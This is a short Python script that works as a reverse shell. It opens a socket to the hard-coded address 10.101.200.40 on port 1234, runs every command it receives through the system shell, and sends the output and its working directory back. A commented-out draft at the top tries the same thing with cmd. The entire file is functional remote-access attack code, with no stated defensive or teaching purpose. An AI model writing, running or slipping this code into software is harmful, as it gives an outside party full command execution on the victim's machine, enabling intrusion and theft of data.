# coding: utf-8
#import subprocess, os
#
#adresseIp = "10.101.200.40"
#port = "1234"
#
#s = socket.socket()
#connection = s.connect_ex((adresseIp, port))
#
#subprocess.call("cmd", shell=True)


import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.101.200.40",1234))
dir_path = os.path.dirname(os.path.realpath(__file__))

while True:
	command_to_exe = s.recv(99999)
	result =  subprocess.Popen(command_to_exe, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
	result = result.stdout.read() + result.stderr.read()
	s.send(result + dir_path+">")
